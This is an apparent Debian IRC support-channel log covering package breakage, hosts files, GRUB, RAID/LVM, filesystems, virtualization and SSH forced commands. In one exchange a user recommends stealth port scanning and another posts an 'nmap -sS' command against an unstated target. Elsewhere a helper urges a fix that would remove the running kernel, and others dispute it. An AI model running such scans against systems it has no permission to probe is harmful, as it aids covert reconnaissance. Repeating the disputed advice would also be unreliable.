00:38  MagusOTB: I'm looking to set up a traffic shaper for my network, and am sort of lost as to where to even start. Can anybody suggest packages I should look into or things I should be googling?
00:39  abrotman: !wondershaper
00:39  dpkg: The Wonder Shaper is a script which uses the traffic shaping features of the Linux kernel to fix some problems, including making downloads continue at full speed while uploads are happening at max rate, plus keeping good interactive response times while bulk transfers are busy.  Packaged for Debian, read /usr/share/doc/wondershaper/README.Debian after installation.  http://lartc.org/wondershaper/  See also <lartc>.
00:39  MagusOTB: abrotman: Awesome, thanks :D
00:56  matte3560: Okay, I found this guide to compiling a new kernel (http://goo.gl/y4Tia). What do I need to change in the config to make the kernel tickless?
00:57  poisonbit: to make the kernel tickles, you need to change (disable) all the things that you (your system) do not use, and take as (M)odule all the things do not needed to boot the initrd

01:30  enyc: razieliyo: no. i believe lenny and later has the needed e2fsprogs. but the squeeze 2.6.32 kernel is needed.  im not sure debian put in the necessary patch to grub to read extent (ext4) files...  grub2 should work...
01:31  razieliyo: I'll try and tell

01:45  bocaneri: I've not been using unrar-free, I've just been using unrar, and so there *may* be differences. Don't know. All I know is, on those rar occasions when I have to use rar, errors aren't recoverable without pars.

01:49  winfix: abrotman: how apt detects which version is installed?

01:55  winfix: themill: hmm

01:56  abrotman: winfix: lucid is NOT Debian .. your system is probably all screwed up
01:56  themill: winfix: you probably need to do an "aptitude update; aptitude full-upgrade" to finish it off. Take care to look at what aptitude is planning to do to make sure that it isn't going to remove too many things that you want.
01:57  abrotman: and having testing and squeeze will break eventually
01:57  winfix: abrotman: that is only for e17 packages
01:57  jst: Hey, all.  I downloaded the XFCE/LXDE CD, but only LXDE is being intalled.  Is there any way I can set it to install ONLY XFCE?
01:58  abrotman: winfix: it may still break .. and Ubuntu is not Debian
01:58  winfix: themill: well this errors also remove aptitude ..
01:58  kj4: jst: are you using the graphical install option?
01:58  themill: winfix: try using apt-get instead then

02:20  winfix: plugwash: that it's going to remove 255 packages (including python)
02:20  plugwash: you are trying to upgrade from lenny to squeeze right?
02:20  abrotman: winfix: can you install aptitude now ?
02:21  plugwash: winfix if apt-get -f install proposes a soloution i'd let it go ahead with it. Python is not essential on debian and you can always reinstall it later.
02:22  jhutchins_lt: plugwash: Actually, python is pretty heavily integrated into the system.  So much so that trying to change versions results in serious usability problems.
02:22  winfix: abrotman: no
02:23  abrotman: winfix: so 'apt-get -f install' .. says what ?
02:23  jhutchins_lt: People trying to push newer versions onto existing systems usually end up having to reinstall the system.

02:24  winfix: :|
02:24  plugwash: jhutchins_lt, quite a bit may depend on it but it is not an essential package and i've never had a problem with removing it and installing it again later
02:25  winfix: abrotman: what is that for?? :S show sources.list?
02:25  abrotman: yes please

02:29  plugwash: that is the only sane way out of the situation you are in
02:29  winfix: plugwash: going to do it
02:31  abrotman: that's going to remove his running kernel
02:32  winfix: abrotman: but i can reinstall it
02:32  jhutchins_lt: *F00F*!
02:33  plugwash: hmm, so it is, i'd still go ahead with it though the important thing is getting the packages back into a consistent state
02:34  plugwash: no kernel installed isn't an ideal state to be in but as long as you get one installed before the next reboot it isn't fatal
02:35  islevegan: any idea why i would get help details when i type apache2 restart as root?

03:41  abrotman: AndroUser: did you get a better error from /var/log/Xorg.0.log ?
03:42  AndroUser: when i boot, it goes to cli so i login and startx, then it tells me parse error on line 138 of section serverlayout in file /etc/x11/xorg.conf ....... then ...... fatal error: no screens found ...... then ...... it tells me look at the log at /var/log/xorg.0.log

03:42  abrotman: pastebin it for us if you can

03:45  AndroUser: then the same thing again with VT_GETMODE substituted for KDSETMODE

06:44  cheako: From a fresh Lenny install.
06:45  gnarface: cheako: probably the first thing to ask is what you were trying to do when you got that error
06:46  cheako: Well, it's brag..  However brag does not use libdb... until after I changed it.
06:46  gnarface: i'm assuming the first thing you checked is that the file is actually present?
06:47  cheako: Now I'm trying to copy my version of brag onto a RackSpace server.
06:47  cheako: gnarface: Correct and it's ldd is also fine looking.
06:47  dondelelcaro: cheako: so aptitude install brag;
06:47  cheako: dondelelcaro: As indicated brag does not depend on any form of libdb.
06:48  cheako: I changed brag to use libdb for some of it's internal arrays to improve performance... I.E. the process was growing to several GBs in size.
06:48  dondelelcaro: cheako: because it doesn't use it by default. If you're going to use it, then you need to install the appropriate libdb*-tcl; package
06:49  cheako: dondelelcaro: Correct, but how can I identify the appropriate package?
06:49  dondelelcaro: cheako: it depends upon which libdb version you want to use
06:49  cheako: I was able to install this package libdb4.6-tcl and now I get the error.
06:51  gnarface: cheako: maybe you got a version mismatch?  when i run apt-file search libdb_tcl.so on sid i see it listed in packages versioned from 4.5 to 5.1
06:51  cheako: I'd be fine with any libdb, as indecated the problem was the arrays used are several GBs in size, so hashing them out to disk is essential.
06:51  dondelelcaro: cheako: you may need a newer version of tcl then. I'm not sure why there isn't a reverse dependency on the right tcl version from libdb*-tcl, but whatever.
06:51  cheako: How can I chose/pobe/identify the correct version?
06:52  cheako: Ahh, so try an older libdb*-tcl package?
06:52  dondelelcaro: cheako: no, try a newer tcl.
06:52  gnarface: cheako: that's a great question.  one i'd like to know the answer for.  myself i'd start with the newest one and then work my way back if that didn't work
06:53  gnarface: cheako: lenny is pretty old.  are you including the backports in your apt sources?
06:53  cheako: I havn't touched that on this server.
06:54  dondelelcaro: gnarface: you don't need backports at all.
06:54  dondelelcaro: not for this, anyway
06:54  gnarface: noted.  i didn't know so i figured it was worth a try
06:54  cheako: libdb4.5-tcl fails.
06:54  dondelelcaro: cheako: which tcl do you have installed?
06:54  dondelelcaro: cheako: the problem isn't with libdb*-tcl; it's with tcl.
06:55  dondelelcaro: (you're trying to dlopen libdb-tcl.so into a version of tcl which doesn't match the version it was compiled against)
06:55  cheako: libdb4.2-tcl fails.
06:55  dondelelcaro: they're all going to fail with the same error...
06:55  cheako: dondelelcaro: how can I tell?  -v -V and --version all report '%'
06:56  dondelelcaro: cheako: dpkg -l tcl
06:56  cheako: No packages found matching tcl.
06:56  cheako: Yay?
06:56  gnarface: dpkg -l |grep tcl
06:56  dpkg: No packages found matching |grep tcl
06:56  dondelelcaro: cheako: dpkg -l tcl*; then.
06:56  cheako: I'm just going to jump off a bridge now.
06:56  cheako: tcl8.3
06:57  dondelelcaro: cheako: so install tcl8.4

07:01  bonjoyee:  gnarface:no i installed it from minimal cd ...nothing crap per se..
07:01  dondelelcaro: bonjoyee: it can if your hostname isn't specified properly or you're doing other things that are random, or your machine is slow, or [...]
07:02  bonjoyee: started with gnome-core, gdm and xorg-xserver-core thats it..
07:02  gnarface: bonjoyee: what default startup applications?
07:02  gnarface: hostname specified as "localhost" bonjoyee?
07:03  bonjoyee: here are the specs..AMD AthlonX2 64, 2GB DDR2, 250GB SATAII,MSI K9AGM4-L Mobo..
07:04  bonjoyee: by default i mean things like gnome-power manager, bluetooth. and other gnome thingy...none that i installed myself
07:05  bonjoyee: 127.0.0.1	localhost
07:05  bonjoyee: 127.0.1.1	htpc	
07:06  bonjoyee: thats the /etc/hosts  for you
07:06  gnarface: what does 'hostname' report?
07:06  bonjoyee: gnarface:htpc
07:07  gnarface: dondelelcaro: what's that 127.0.1.1 crap for?
07:09  bonjoyee: by the way i have disabled ipv6 by adding ipv6.disable=1 to kernel line..if that matters
07:09  dondelelcaro: gnarface: it's another ip address on localhost; perfectly reasonable
07:09  dondelelcaro: bonjoyee: you're missing the FQDN in /etc/hosts
07:09  gnarface: dondelelcaro: will it work if ifconfig only has 127.0.0.1 and the publc/lan ip?
07:10  dondelelcaro: gnarface: sure, but there's no reason not to resolve the hostname to localhost
07:10  dondelelcaro: since that's actually what you want, anyway
07:10  bonjoyee: dondelelcaro:how do i rectify it?
07:10  gnarface: that's the way i always set it up, but i had a lenny install do this to me once and i can't remember ever figuring out why.  i just fixed my etc hosts and everything was fast again
07:11  Intensity: Hi.  I am attempting to build a binary statically within a 6.0 chroot to be used on 5.0.  I run the last link command manually, adding -static.  But I get many errors about undefined references.  I grep for those in /usr/lib/lib*.a and then systematically add the library with the link command.  Generally, this process works.  I'm wondering if there is a better way in general.
07:12  gnarface: Intensity: ultimately your chrooted environment has to be compatible with your host system's kernel.
07:12  bonjoyee: also i use a static private ip for this desktop 192.168.1.100 and connected to internet through a dsl modem using bridged mode
07:12  bonjoyee: and all this is done using network-manager
07:12  dondelelcaro: bonjoyee: it should be something like htpc htpc.foo.com or whatever
07:12  gnarface: bonjoyee: then 192.168.1.100 is what you want htpc to be set as, and that line should ideally have the domain in it too, not just the hostname
07:13  gnarface: 127.0.0.1	localhost.localdomain	localhost
07:13  gnarface: 192.168.1.100 htpc.foo.com htpc
07:13  dondelelcaro: gnarface: no.
07:13  gnarface: no?
07:13  dondelelcaro: just 127.0.1.1 htpc.foo.com htpc
07:13  gnarface: oh
07:13  dondelelcaro: you don't care what the external ip is
07:14  gnarface: oh
07:14  gnarface: i see.  it still works that way no?
07:14  bonjoyee: also this happens only after shutdown/reboot...if i logout after starting up..then the logins are fast
07:15  rpgdude: im going to need a new drive anyway
07:15  rpgdude: LVM uses different partition type
07:18  bonjoyee:  gnarface,dondelelcaro thanks for that..ill try and report it right away
07:25  cheako: Are there any steaming servers that have browsing support?  I'd like to host a large body of content in a wide array of both formats and resolution/bitrate.  I'd like to convert and stream content at a set rate so that the archive can be pre-viewd prior to downloading.  I guess thumbnails would be both acceptable and the closes working example I know of.
07:26  gnarface: what is a streaming server?
07:26  cheako: I'm anticipating having to configure vlc or gstreamer for this purpose.
07:26  gnarface: for video, or audio?
07:27  cheako: Video.
07:27  gnarface: something that works out of the box without much modification would be nice.  i'd like to know too, cheako
07:28  gnarface: cheako: i've heard of this one: http://www.red5.org/ but never used it.
07:28  cheako: Yeah, the more I think about it the more I think php->gstreamer.
07:28  cheako: Sounds nice.
07:29  cheako: They have an IRC chan.
07:31  gnarface: my prejudice against java forbid me from trying it.  let us know how it works out for you
07:31  gnarface: my extremely extensive expertise writing php has unfortunately thus far also forbid me from trying to write or use any such thing as a php streaming server too
07:32  cheako: err, wait...  I'm may be a bit silly at times, though the Requirements kill it for me as well.
07:32  gnarface: ruby needs a streaming server

07:33  gnarface: once upon a time i had really good luck with some combination of icecast and a short C program packaged with it but never actually released
07:33  gnarface: useless unfortunately (at least at that time) for authentication, video, or formats other than mp3 though
07:33  gnarface: or stream browsing
07:35  gnarface: any luck bonjoyee?
07:36  bonjoyee: naah...tried several combinations..also enabled ipv6..also edited /etc/hostname to FQDN..but none seems to work
07:37  gnarface: bonjoyee: you say this is happening after you've gotten to the graphical login?
07:37  bonjoyee: when i was using ubuntu..logins were instant..not that i would like to go back to ubuntu for this one reason
07:37  gnarface: bonjoyee: you are or are not using graphical login?
07:38  cheako: I'd like to move away from Ubuntu on my desktop for one reason.  So the world is all right again.
07:38  bonjoyee: to get to gdm login screen after powering on takes 15-20 secs..but after entering login info it takes 10-12 secs to get a workable desktop..which seems odd

07:47  gnarface: uh
07:47  gnarface: hmm
07:47  gnarface: doesn't quite match mine
07:47  gnarface: i'm not clear on ipv6
07:47  gnarface: looks like you might have some wrong though
07:47  gnarface: if you have ipv6 disabled still then it shouldn't matter though
07:47  gnarface: i'd comment those lines out
07:48  bonjoyee: http://paste.debian.net/101626/
07:48  gnarface: ok that looks right
07:48  gnarface: assuming those nameservers are actually working

07:49  bonjoyee: yes those are opendns family shield ones..
07:50  gnarface: oh boy that's a messy network connection you have there
07:50  gnarface: ppoe ?
07:50  bonjoyee: yes
07:50  gnarface: yuck
07:50  gnarface: ok
07:51  gnarface: now just for good measure what's in your /etc/hostname and what is the output of the command "hostname" (i think they should match)
07:51  gnarface: i'll try to fix your /etc/hosts and pastebin it
07:51  bonjoyee: both "htpc"
07:52  gnarface: so your dyndns domain name is htpc.jrsoft.dyndns.org?
07:52  bonjoyee: it was..but have not used it recently..
07:52  bonjoyee: just a placeholder sort of
07:53  gnarface: sure.
07:53  gnarface: http://pastebin.com/AS7jADU2
07:53  gnarface: i think you want your /etc/hosts to be this then
07:54  gnarface: put that in, re-enable ipv6, then reboot and tell us how it works
07:55  bonjoyee: actually i could access my pc from the internet using just http://jrsoft.dyndns.org back when i used it
07:55  gnarface: oh i see
07:55  bonjoyee: along with ddclient..
07:55  gnarface: perhaps you want the hostname to be htpc then
07:55  gnarface: i mean, jrsoft
07:55  bonjoyee: yes
07:56  gnarface: ok if you want to change it to htpc lets just try this: http://pastebin.com/MYUgfMQq
07:56  gnarface: should work but if you want to access it from outside again you'll have to re-sign-up with dyndns.org

08:16  gnarface: you said you use graphical login?
08:16  gnarface: so X has already started before you type your username/password, right?
08:17  bonjoyee: this is a minimal installation which I have built up also with "install recommended packages" disabled..could i be missing some packages?
08:17  bonjoyee: yes..X starts within 15-20 secs as i said
08:18  gnarface: there is a lot of possible issues, but the most likely issue if its not a network timeout is not that something is missing, but rather that something is there you don't want
08:18  gnarface: and possibly it is malfunctioning but it is entirely likely that its just normal
08:18  gnarface: see, it only takes me about half a second to get to my desktop, but i use e16 as a window manager and don't start a god damned thing by default
08:19  gnarface: out of curiosity, when you log in, does the desktop resolution change, or try to change?  can you see then screen black and hear the monitor re-sync then redraw?
08:20  bonjoyee: no its fixed at 1440x900...the wallpaper shows all the time but the panels/icons come up after 10-12 secs
08:20  gnarface: another possibility is that it could be cycling through unsupported resolutions/drivers due to a bad xorg.conf or a video card driver bug but if X is already loaded and you don't see the resolution change that is unlikely
08:20  gnarface: here's a question
08:21  gnarface: does the harddrive run like crazy during this timeout? and does your mouse still move the cursor?
08:21  bonjoyee: mouse moves..but the hard disk activity seems high..but no abnormal sound/things like that
08:22  gnarface: you're using gnome you said?
08:22  gnarface: i ditched both gnome and kde for taking too long to boot
08:22  bonjoyee: yes..
08:22  gnarface: long ago
08:23  gnarface: maybe try killing some of those default apps?
08:23  gnarface: i don't even know what gnome starts by default, e16 doesn't even have a toolbar
08:23  bonjoyee: the cursor shows as a spinning icon during this time
08:23  bonjoyee: throbber as they call it
08:26  gnarface: does gnome run on compiz-fusion in that setup now?
08:27  gnarface: or is gnome its own thing now?
08:28  bonjoyee: no compiz..its not even installed..
08:29  gnarface: could be a known bug
08:29  gnarface: or even a fixed bug
08:29  gnarface: when was your last update?

08:31  Cullz: mactimes; i bet there's a mailing list
08:32  gnarface: bonjoyee: i'm seeing a lot of complaints about slow login in gnome in both debian and ubuntu of various versions.
08:32  bonjoyee: also how big in terms of download is this e16?
08:32  gnarface: i'm not sure honestly but it can't be much
08:33  bonjoyee: is it a window manager? or an entire DE like KDE...also will my current apps work with it?
08:34  gnarface: it is just a window manager
08:34  mactimes: Cullz, Sure there is.  But since I'm not involved in the process yet, I'm thinking about acting as a trainee or something like that, so that I can get used to the work flow instead of disrupting the whole attention to my newcomer stupid questions.
08:35  gnarface: bonjoyee: some apps will require that you're actually running gnome.  you'd have to check them on a case-by-case basis, but for many it is sufficient that you just have the gnome libraries installed
08:36  Cullz: mactimes; how much experience with programming is necessary to help with software development? can any of it be done through  visual based tools or is it all code?

08:39  bonjoyee: ok,,,thanks..take care

08:39  mactimes: Cullz, What do you mean?  I mean, why are you asking _me_ that?
08:40  Cullz: mactimes; i don't mean to be rude. i'm just interested in the process. thought you might be building other linux software
08:42  mactimes: Cullz, Well, then you're interested in the same things I am.  Since I never got involved with the _community_ development, I'm interested in learning about the process and see if I can keep up before wasting _busy people_ time. :P
08:48  Cullz: i don't do any coding but i like trying things. had a lot of fun breaking debian twice with dpkg. also broke some ubuntu partitions.
08:48  mactimes: Cullz, What I'm really looking for is to help maintaining/fixing minor bugs, you know and problems, the small things no one wants to do, before getting my hands dirty with the core _dough_.  This way I can start helping without slowing down the rest of the coders until I get really used to the _timing_ and process.
08:51  zeon1686: after i install debian 5, i reboot and when the grub boot loader starts is shows "debian installer" (again). how can i get pass this?
08:52  mactimes: zeon1686, Remove your CD from the CD drive.
08:52  sep: take out the cd ?
08:52  sep: or alter the bios boot order
08:52  zeon1686: cd is out
08:53  zeon1686: i set it to boot from hdd but it only show my window xp and debian installer
08:54  zeon1686: debian has to come first in the boot order b4 windows?
08:56  zeon1686: after i install debian 5, i reboot and when the grub boot loader starts is shows "debian installer" (again). how can i get pass this? cd taken out, can any one help?
08:57  gnarface: zeon1686: are you trying to tell us that after grub there is a second boot loader that prompts you for windows xp or "debian installer" ?
08:57  sep: and you are sure this is grub and not some other bootloader ?
08:58  zeon1686: no only grub comes up and it ask to start windows xp or "debian installer"
08:58  zeon1686: its grub. the one from the installation

08:59  sep: how did you install ?
08:59  zeon1686: i installed from a cd. iso to cd, restart computer n installed it on a second hhd
08:59  zeon1686: hdd*
08:59  peterrooney: tsccof: IIRC, the xmms project hosts a legacy xmms deb
09:00  gnarface: zeon1686: and you didn't get involved with usb key installer or installing from a harddrive partition?  maybe somehow the debian install got mislabeled. what happens when you select it?
09:01  tsccof: peterrooney: ah, will build from source! thanks a lot!
09:01  zeon1686: wen i select debian installer it does the installer over again but has 'rescue mode' in the top right corner
09:02  zeon1686: installed right from cd
09:02  gnarface: zeon1686: are you sure you actually installed debian? it sounds like you copied the installer from the cd or something weird
09:02  zeon1686: i got the iso from the website. but it does sound like that
09:02  gnarface: zeon1686: did you follow some tutorial you can link?
09:03  gnarface: zeon1686: also link the actual iso you used
09:03  zeon1686: yea i read some tutorials. so are u sayin that there is a installer iso n the actual os iso?
09:04  gnarface: zeon1686: there are actually a plethora of different isos and different ways to install debian.  i'm not saying anything i'm just trying to figure out what the hell happened
09:04  antii: if im getting squeeze now for my server, will it be safe to do a dist upgrade when final is out?
09:04  Tgh543: is there a way to prevent debian from installing linux-image package and modifying grub menu when doing apt-get upgrade ? (I'm running custom kernel)
09:05  zeon1686: me too. lol. hmm.
09:05  zeon1686: its installs fine though, i jus never come to a login screen
09:05  gnarface: do you remember getting the option to select packages?
09:06  zeon1686: yes i selected packages, it went all the way to the end of the installation wen it pops out the cd automatically
09:07  gnarface: zeon1686: beats me.  this has never happened to me.  is this your first linux install?
09:07  zeon1686: when grub starts its suppose to say "debian" right? not 'debian installer'
09:07  zeon1686: actually my second.
09:07  gnarface: well on mine it says the kernel version of several different kernels....
09:08  zeon1686: the first time i installed unbutu n the screen resoulution was way to big n i could find a way to lower it
09:08  gnarface: Tgh543: i think this is not what you want.  I think what you want is your custom kernel properly installed so it can coexist in the boot loader as a default option alongside the others
09:08  zeon1686: the screen size i neam

09:10  Tgh543: gnarface: I installed the kernel the debian way (make kpkg etc), it co-exist without a problem, but when I do apt-get update, sometimes it installs linux-image and update grub's  menu.lst and reset my custom parameters (vga=791 for example)
09:10  gnarface: Tgh543: I think if you put them in the right place in the config this does not happen
09:10  zeon1686: thanks for the suggestions. later
09:11  Tgh543: gnarface: that is ?
09:11  gnarface: Tgh543: the line where it says default parameters
09:12  Tgh543: gnarface: you mean before the "automagic" stuff ?
09:13  gnarface: Tgh543: i'm not sure if the version of grub i'm running even uses menu.lst anymore, but yes.  there is a section where it says default kernel options and shows some commented-out examples
09:14  Tgh543: gnarface: exactly, before the ## ## End Default Options ## line, but it doesn't work.... :s
09:14  Tgh543: gnarface: that's no big deal because it doesn't happen very often, I'll continue doing it manually, thanks for your help anyway
09:15  gnarface: Tgh543: i think you're making a syntax error.  find the line that starts with # kopt=root=UUID=.....
09:15  gnarface: then add to the end of that line.  don't remove the # or anything else on it
09:17  Tgh543: gnarface: I see, I'll try it.
09:18  gnarface: Tgh543: but like i said if that doesn't work you also need to make sure you're not using a grub that has moved the config to /etc/grub now... i don't even know how to work that yet

09:30  wieshka: or you suggest to do it with debian installer ?
09:31  sep: wieshka, i thought you asked about setting it up via the installer. sorry.
09:32  gnarface: i thought the point of LVM was so that you didn't need to use RAID to mirror partitions?
09:33  dondelelcaro: gnarface: the point of lvm is that you can snapshot and dynamically allocate partitions
09:33  Tgh543: penus: use stealth scanning (sync)
09:33  dondelelcaro: wieshka: you just shove the disks in, partition them, then raid them using mdadm; pretty straight forward
09:34  penus: Tgh543, how do i do that?
09:34  wieshka: so in basics, i need to create partition on both disks as Linux raid autodetect, then i should mdadm --create /dev/mda0 --level 1 <devices> .... and then with lvm2 i do pvcreate and i can operate with it as with normal disk
09:34  sep: wieshka, correct
09:35  wieshka: possibe problem - isnt LVM first detected, and RAID secondary ?
09:35  wieshka: durring the bootup ?
09:35  penus: Tgh543, found it nmap -vv -sS IP
09:35  tsccof: what was the programme I could use for checking dependencies during ./configure?
09:35  penus: thanks
09:36  wieshka: huh, but my system is out of RAID, so they will be mounted during rc.d, so lets get work done ... :)
09:36  sep: gnarface, you can mirror a volume with lvm. but you then usualy mirror each volume. if you have many volumes it's easier to manage the raid1 as a md device (imho)
09:37  sep: and since lvm have so many other benefits lvm on raid1 is quite common
09:37  dondelelcaro: wieshka: not necessarily
09:37  sep: wieshka, i usualy have a 200 mb partition on the start of the disks. that i raid1 together and mount as /boot
09:38  dondelelcaro: wieshka: normally you have lvm on top of raid
09:38  sep: then  the rest of the disk used with lvm
09:39  wieshka: sep why i need seperated /boot partition on data storage only disks, if i have one on system HDD ?
09:39  sep: since it's much easier to troubleshoot in the future if you have /boot outside the lvm (again imho)
09:39  sep: then you do not
09:39  Bartzy: For a laptop, what you'd recommend ? Ext3 or ReiserFS ?
09:39  sep: only if you boot on the raid+lvm disks
09:39  fignew: Bartzy: Ext3
09:39  sep: Bartzy, NEVER reiser
09:40  sep: ext3 for sure
09:40  fignew: yea, ext3 isn't great, but a lot better than reiser
09:40  Bartzy: Why ?
09:40  fignew: I use XFS personally
09:40  dondelelcaro: wieshka: usually you'd want a mirrored system drive too, but it's not needed
09:40  Bartzy: XFS is for huge files and huge filesystem generally ?
09:40  gnarface: it works well for that
09:41  gnarface: i don't have any problems with reiserfs but it has slipped lately in benchmarks against others...
09:41  Bartzy: Can you link to benchmarks ?
09:41  gnarface: xfs is entirely undersold
09:41  Bartzy: ext3 performance is fine ?
09:41  wieshka: my 1U case has only 3 disk slots ...... yeah, i know, that i should have system mirrored also, but it this case it is for backups only
09:41  gnarface: nobody uses ext3 for performance, they use it because its the one everyone uses so that's safer
09:41  Bartzy: Also, not a problem to install squeeze on the laptop right ? I think it's the right choice
09:41  sep: xfs's default options are more fragile if you do not have a ups with controlled shutdown then ext3's default options. a laptop have built in batters so probably nice there :)
09:42  Bartzy: gnarface: And for performance (servers), what's considered good (Just asking out of curiousity)
09:42  antii: safe to use debian testing for "homeserver" purpose?
09:42  dondelelcaro: Bartzy: of the people who come in here with filesystems that have blown up, most of them run reiser
09:42  Bartzy: dondelelcaro: Good to know.
09:42  dondelelcaro: (though nowadays that's tailed off slightly)
09:43  gnarface: reiserfs started out really rough
09:43  fignew: Bartzy: for servers? ext3,XFS,JFS,ext4
09:43  vtts: antii, what do you mean by "safe"?
09:43  gnarface: but that was like in 1998
09:43  fignew: same for desktops/laptops/servers :P
09:43  antii: vtts: getting no problems
09:44  Bartzy: It's generally recommended to seperate my /home in another partition than the rest of the system ?
09:44  Bartzy: If I'll need to reinstall or something ?
09:44  jelly-home: antii: it probably won't eat your cat.
09:45  gnarface: these aren't the benchmarks i was looking for but google says they're the most recent.  anyone got better ones? http://www.phoronix.com/scan.php?page=article&item=linux_2634_fs&num=1
09:45  vtts: antii, well not all bugs are fixed yet, hence it is not stable yet, but personaly i've been using it in production for few months and have not encountered any serious problems yet.
09:45  gnarface: here's benchmarks that include reiserfs but they're from 2006 ... http://www.debian-administration.org/articles/388
09:47  antii: jelly-home: hehe
09:47  sep: gnarface, reiserfs is ok for /tmp
09:48  tsccof: what was the programme I could use for checking dependencies during ./configure?
09:49  gnarface: Bartzy: for a desktop system if you are not using LVM you may find it annoying to have to resize two partitions if you run out of space.  on laptops i often just put everything in /, but on servers i typically aim for carefully chosen sizes for separate partitions for /,  /usr, /home, /tmp, and /var
09:50  gnarface: Bartzy: reiserfs's primary speed benefit was in dealing with groups of small files, which used to be something webservers had a lot of.
09:51  antii: vtts: alright, will it be ok to upgrade to stable when it comes out aswell? (dist upgrade)?
09:52  alcy: If a bug has been found and patched upstream, then should the debian maintainers be notified to include the changes accordingly ?
09:52  fignew: alcy: security bug?
09:52  Bartzy: gnarface: Why do you do that for servers (the sizing) ?
09:53  alcy: fignew: segfaults/crashes
09:54  fignew: alcy: I don't know, but I think the answer is no. Someone who isn't talking out of their butt care to answer?
09:54  gnarface: Bartzy: because if your / partition fills up your machine will fail to boot, and if your /var partition fills up then shit that writes logs there will choke
09:55  vtts: antii, i don't see any reason why it would not be ok. Further more i think it will be easier than upgrading from lenny.
09:57  wieshka: how stable ext4 is on debian ?
09:58  Kamping_Kaiser: about 7.4
09:59  jargon-: no debian squeeze packages for conkyforecast? no debs at all it seems. anybody use conkyforecast?
09:59  alcy: wieshka: define stable. you inquiring for general purpose/desktops or servers ?
09:59  wieshka: alcy - server, backup data storage
09:59  wieshka: disk size ~1.8 Tb / RAID 1 / LVM
10:01  alcy: wieshka: hmmm. can't help you there specifically, but at least that narrows down your query. for eg. recently I was suggested to stick to ext3 for mysql replication needs etc.
10:02  wieshka: lets create a ext3 ... hmm, intresting, do i have on any of servers/virtual servers/desktops ext4 ? :)
10:03  cheasee: hi, im googling for a short howto about how to run a guest with xen/qemu or similar on an intel cpu without VT. could anyone point me in the right direction please? :)
10:03  antii: vtts: ah!
10:04  antii: vtts: thx :]]
10:04  cheasee: all i find on google are walkthroughs using hvm which isnt supported on my cpu
10:06  gnarface: i thought having hvm wasn't mandatory it just made it faster?
10:06  gnarface: no?
10:07  gnarface: i like linux-vserver but it won't be of any use for running non-linux guests
10:09  Selveste1: cheasee: I have just joined, XEN or Vserver guids.?
10:10  cheasee: gnarface: i thought so too, but i guess it needs some other config than the ones i find on the net with hvm support
10:11  cheasee: Selveste1: xen/qemu/kvm ..
10:12  gnarface: cheasee: do you need to run non-linux guests or is this just for a virtualized homogeneous cluster of nodes?
10:15  Selveste1: cheasee: try this site - its based on non-hvm (danish) but google translate is you friend, http://www.semarkit.dk/wiki/index.php/Xen_server - im working on an english version but for now its on danish
10:16  cheasee: gnarface: yes i want to run non-linux guests
10:17  cheasee: i just reinstalled kvm and it automatically disabled hardware support, guest runs fine though
10:17  cheasee: strange, before i got error that there is no hardware support.. well, now after trying xen, it works
10:21  Bartzy: I want to install squeeze using net installer.. I should download squeeze beta 1 ?
10:22  miguel000: I have a german keyboard but want to change the laylut to US ENGLISH. howver dpkg-reconfigure console-data does not help
10:22  miguel000: layout
10:25  miguel000: also loadkeys de and loadkeys us does not make any difference
10:25  miguel000: ?
10:25  Selveste1: How can you run non-NIX on hardware that don't support HVM.?

10:34  Kamping_Kaiser: petern_: and yes, fair point, i read that wrong :/
10:37  gnarface: once upon a time i tried to use nautilus.  i couldn't figure out how to get it to be even remotely as useful as windows explorer, so i thought "wtf is the point then?" and went back to launching everything from the shell manually
10:38  gnarface: tab completion is awesome
10:38  gnarface: true story
10:38  Kamping_Kaiser: then agian, you don't need to tab complete if you don't need to type the whole word
10:41  gnarface: sometimes i supplement with the occasional mouse action
10:41  gnarface: having a paste button by default and a clipboard automatically populated by text selection totally blows the doors off windows
10:41  gnarface: also, focus follows mouse and no automatic window re-stacking
10:41  gnarface: i like it old skool
10:43  Iridos: if that wasn't totally offtopic I would now say "what? Explorer is useful? What for?"
10:44  gnarface: i was just relating my vast dissappointment with the quality and refinement of nautilus
10:44  gnarface: if you knew me you'd know how much it hurts me to have to compare it unfavorably to explorer
10:44  gnarface: i fucking hate microsoft
10:45  gnarface: to the point i actually boycott their software
10:45  gnarface: but it makes one wonder... why has nautilus gone so horribly wrong?
10:45  Kamping_Kaiser: i'm torn between not caring, and being interseted in why you think its so much better
10:45  gnarface: ffs double click doesn't always work
10:46  gnarface: epic fail
10:46  gnarface: there were other missing features which may be there now... like the ability to right-click inspect a directory and get a popup that listed the count and total file size of its subfolders/files
10:46  gnarface: the ability to drag+drop in any meaningful way
10:47  gnarface: all stuff i don't need or use because i've now become faster with a terminal
10:47  gnarface: but still...

11:12  petern_: Kamping_Kaiser, and of course the correct packages work properly
11:14  llutz: zealiod: i'm not sure
11:23  d0x: Hi, did someone know how to force update-grub to have a log on sda and sdb?
11:30  bla: zealiod, you can add your script to /etc/shells and set it as a shell
11:31  bla: zealiod, you can also use SSH key options in ~/.ssh/authorized_keys - that is, give him single key with which he can log and execute this single command
11:31  bla: man authorized_keys for the latter; there're examples
11:32  zealiod: bla: could they drop out of that shell and access the command line?
11:32  bla: The first approach? Doubtful, they would have to 'hack' your script. If it's not interactive it's very hard.
11:33  bla: Read on the second (ssh) option. It's nicer generally.
11:33  bla: command="dump /home",no-pty,no-port-forwarding (here goes key)
11:33  bla: This even turns off some ssh options normally available (port forwarding)
11:33  bla: and disables PTY.

12:58  acemi: Bartzy: there is no direct relation between the size of RAM and the size of swap
12:58  Bartzy: acemi: OK, what do you suggest (laptop)
12:59  acemi: I think you don't need swap if you don't use hibernate
12:59  stew: acemi: there is if you are going to suspend to disk
13:00  babilen: Bartzy: 4GB of swap is most likely enough. This setting is important if you want to hibernate (suspend to disk) -- If you don't plan to do that, you could also allocate less disk space
13:00  stew: although you don't need swap, your machine would likely be slower without it (depending on your usage patterns)
13:00  Bartzy: so for hibernation I must use more than 4GB (more than my RAM ?)
13:01  babilen: zmitya: Do you think that would be a good approach? I can't really think of anyhting else right now :-\
13:01  stew: Bartzy: no, when you hibernate, the image is compressed
13:01  stew: zmitya: man apt_preferences.  if you don't want a package installed, pin it below 0
13:03  Bartzy: Does it make a difference what's first : swap, boot or root partition ?
13:03  abrotman: no
13:04  abrotman: it used to, but unless you're using an old lilo, it shouldn't matter anymore
13:04  zmitya: babilen: thanks
13:04  zmitya: stew: thanks, I think this is that I'm looking for...
13:04  Bartzy: OK... why it used to ? Also, 256mb for boot is also ok ?
13:04  babilen: stew: Would that work with metapackages as well?
